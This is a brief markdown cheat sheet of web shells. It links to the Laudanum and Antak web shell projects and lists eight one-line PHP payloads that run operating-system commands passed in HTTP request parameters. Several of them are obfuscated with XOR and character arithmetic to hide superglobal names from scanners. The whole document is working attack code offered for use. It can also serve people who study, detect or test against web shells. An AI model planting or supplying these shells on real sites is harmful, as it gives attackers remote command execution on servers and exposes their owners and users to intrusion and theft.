# Web shells

- [Laudanum](https://github.com/jbarcia/Web-Shells/tree/master/laudanum)
- [Antak webshell](https://github.com/samratashok/nishang/tree/master/Antak-WebShell)

## PHP
```php
<?php system($_REQUEST["cmd"]);?>
```
```php
<?=`$_GET[0]`?>
```
```php
<?=`$_POST[0]`?>
```
```php
<?=`{$_REQUEST['_']}`?>
```
```php
<?=$_="";$_="'";$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'^'o'];echo`$_`?>
```
```php
<?php $_="{"; $_=($_^"<").($_^">;").($_^"/"); ?> <?=${'_'.$_}["_"](${'_'.$_}["__"]);?>
```
```php
<?php $_=${'_'.('{{{' ^ '<>/')};$_[0]($_[1]($_[2])); ?>
```
```php
<?php $_=${'_'.('{'^'<').('{'^'>;').('{'^'/')};$_[0]($_[1]($_[2])); ?>
```